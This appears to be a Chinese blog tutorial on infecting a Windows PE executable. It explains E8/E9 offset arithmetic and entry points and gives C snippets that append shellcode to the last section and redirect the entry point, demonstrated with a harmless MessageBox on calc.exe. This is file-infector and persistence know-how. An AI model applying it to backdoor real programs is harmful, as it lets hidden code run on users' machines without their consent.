> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/YWGbSzd0JA6BVjur94d9oQ)

![](https://mmbiz.qpic.cn/mmbiz_png/TnnmypeImicyIbtk4miaeK9VsIfndhG8rZeTnDiac6ufm8gQnicxTOdfVN17sK9SzLtSx52ia0Ukr3Pl4BXwtTW3tYQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/3apibeqXIibtlRSmdBjDMSx9FCL7fjGMzIVib4dibPCBw2JmACuznE2OokaNzdAXccENNNqt7GBEB4fRYQoibpME6EQ/640?wx_fmt=png)

点击上方 蓝字 关注我们

![](https://mmbiz.qpic.cn/mmbiz_png/HYPZIU9WnjTmwiarw5BuaVjscJg8HHwCsNia66NbCxv7KFRgtHevX1pSk7iadnlt1bNTN5D50uPYEdqM7don6cprA/640?wx_fmt=png)

实现功能

在目标进程的源文件中写入 shellcode，当软件启动 / 重启是触发 shellcode。  

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibowW93BbNHUz04azThV3ORWhbb2nDibW0rUIIxnHkzJARv1DGu7CO8sgvkKOicaYcAH0CZy2uSU3rw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibowW93BbNHUz04azThV3ORL4k6R3eZvrBBfnafvIBiaEuQaBkvKNpF8FZic9q6wWJj1qbATzE3b94w/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/HYPZIU9WnjTmwiarw5BuaVjscJg8HHwCsNia66NbCxv7KFRgtHevX1pSk7iadnlt1bNTN5D50uPYEdqM7don6cprA/640?wx_fmt=png)

知识储备

01

  

什么是硬编码?

Intel CPU 的机器指令（硬编码）格式如下图所示：

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibowW93BbNHUz04azThV3ORDrx07Uzb3kwaFZuQkicvSo6kR0QFvMQNa81qlIbPv5HJTNrXDztmiaWg/640?wx_fmt=png)

也就是机器码，就是指令，他本身有自己的格式：

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibowW93BbNHUz04azThV3ORwyyiaeIsRNibTIw0icRSHQ6EjuEA1Yrzad7QFSUNjNrH4n8axRLqzM2RQ/640?wx_fmt=png)

02

  

了解两个硬编码格式

E8 后跟随的硬编码 = 要跳转的地址 - E8 所在的地址 - E8 所在指令的长度

E9 后跟随的硬编码 = 要跳转的地址 - E9 所在的地址 - E9 所在指令的长度

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibowW93BbNHUz04azThV3OR67lA1icG3l0JIDNrpgR581byJfDeH4BVyoJA2Zs3mCDRUVuZS3BDfVg/640?wx_fmt=png)

E8 后跟随的硬编码 = MessAgeBoxA 地址 - E8 所在地址 - E8 指令长度

E8 DD17D376=77D507EA-0101F008-5

E9 后跟随的硬编码 =

(PE.ImageBase+PE.AddressOfEntryPoint)-E9 所在的地址 - E9 所在指令的长度

E9 6334FFFF=(PE.ImageBase+PE.AddressOfEntryPoint)-0101F00D - 5

03

  

什么是 OEP

**AddressOfEntryPoint**

一个 x86 程序运行，并不是从 0 地址开始的，而是从 ImageBase + OEP 处开始运行。

ImageBase 和 OEP 可以在链接器中调整。

ImageBase + OEP = 0x01000000 + 0x00012475  =  0x01012475

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibowW93BbNHUz04azThV3ORqKZSWoIuGc4hlynHRIiavwO2gRvicmMc0s98S5nJbb23bc9qeL9CAuTA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibowW93BbNHUz04azThV3ORMJ1jgCpL3yuMWT2ibQBsgoAddNOSialNmyG64htEYKrBiadKhUHQyXmibA/640?wx_fmt=png)

04

  

x86 下 PELoad

将一个 exe 文件按照内存对齐的格式写到内存中，再将 shellcode 复制到最后一个节的末尾处。

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibowW93BbNHUz04azThV3ORp3soPSCw9CibxfoEFgYGdMljp2nSib6QMGBrlib1QVEHACgNOYsJiaQ3hA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/HYPZIU9WnjTmwiarw5BuaVjscJg8HHwCsNia66NbCxv7KFRgtHevX1pSk7iadnlt1bNTN5D50uPYEdqM7don6cprA/640?wx_fmt=png)

实现流程

1.  将一个待污染的文件读取到内存中：FileBuffer。
    
2.  将 FileBuffer 按照内存对齐的方式拉伸成 ImageBuffer。
    
3.  调整 E8、E9 各自后面的 4 个字节
    
4.  将 shellcode 写到最后一个节表的末尾。
    
5.  将 OEP 调整为 shellcode 的起始地址。
    
6.  按照文件对齐的方式将 ImageBuffer 改为 NewFilebuffer，并写到文件中。
    

![](https://mmbiz.qpic.cn/mmbiz_png/HYPZIU9WnjTmwiarw5BuaVjscJg8HHwCsNia66NbCxv7KFRgtHevX1pSk7iadnlt1bNTN5D50uPYEdqM7don6cprA/640?wx_fmt=png)

实现过程

**前二步：略  
**

**第三步：调整 E8、E9 数据**

```
int E8 = MsgADD - (pNt->OptionalHeader.ImageBase + pSec->VirtualAddress + pSec->Misc.VirtualSize + 8 + 5);
int E9 = pNt->OptionalHeader.ImageBase + pNt->OptionalHeader.AddressOfEntryPoint - (pNt->OptionalHeader.ImageBase + pSec->VirtualAddress + pSec->Misc.VirtualSize + 8 + 0xa);
//重写E8地址
memcpy(imagebuffer + pSec->VirtualAddress + pSec->Misc.VirtualSize + 9, &E8, 4);
//重写E9地址
memcpy(imagebuffer + pSec->VirtualAddress + pSec->Misc.VirtualSize + 0xe, &E9, 4);
```

**第四步：写入 shellcode**  

将 shellcode 复制到文件中

```
//copy shellcode
memcpy(imagebuffer + pSec->VirtualAddress + pSec->Misc.VirtualSize, Shellcode, shellcode_len);
```

**第五步：调整 OEP**  

将 OEP 调整为我们 shellcode 的地址。

```
pNt->OptionalHeader.AddressOfEntryPoint = pSec->VirtualAddress + pSec->Misc.VirtualSize;
```

**第六步：略**

![](https://mmbiz.qpic.cn/mmbiz_png/HYPZIU9WnjTmwiarw5BuaVjscJg8HHwCsNia66NbCxv7KFRgtHevX1pSk7iadnlt1bNTN5D50uPYEdqM7don6cprA/640?wx_fmt=png)

OD 流程分析

主要调整程序的入口执行我们的 shellcode 然后在跳转到原来的地址，保证程序的正常运行。  

01

  

汇编代码

```
push 0
push 0
push 0
push 0
call messageboxA
jmp calc.01012475
```

02

  

程序从指定的 OEP 处开始执行

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibowW93BbNHUz04azThV3ORWqxiaFnk4BKolyenxNz0Qc8t34PO46a3ichtjJLH5lMx3ZSb0IDUA1ww/640?wx_fmt=png)

03

  

解析 shellcode 前八个字节

4 个 push 0 为 MessageBoxA 压参

04

  

调用 MessageBoxA

call messageboxA

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibowW93BbNHUz04azThV3ORHxNvqvvmhN7oRthIQb9a6FVG6xb6xEdFx9iaSoFxjpJqU4qILG5qXEA/640?wx_fmt=png)

05

  

跳转回程序原入口点

jmp calc.01012475

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibowW93BbNHUz04azThV3ORuSJh6OvWd0t7gSUkRVfUtSrN9ibYt0iaN5zYS3hCyPmRILXJibYwwToIw/640?wx_fmt=png)

**注：**

1.  E8 转化为汇编指令就是 call。
    
2.  E9 转化为汇编指令就是 jmp。
    
3.  shellcode 可以根据需要自行调整。
    
4.  注意写入地址是否可执行。
    

end

  

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibowW93BbNHUz04azThV3ORYnTF6VVG2VDhjRweicE8pJst5UBiakSr2opx4LOgUOH13cSCgVWkDqKw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/DRPGpicFk5BvqeFQm89dvWAVHcIysmqlcxfoVMHUEpOOGNEyXRJGSnxbpBTOiayAPiapCyibpPzY6pKCpAM3yINDLg/640?wx_fmt=png)

点个在看你最好看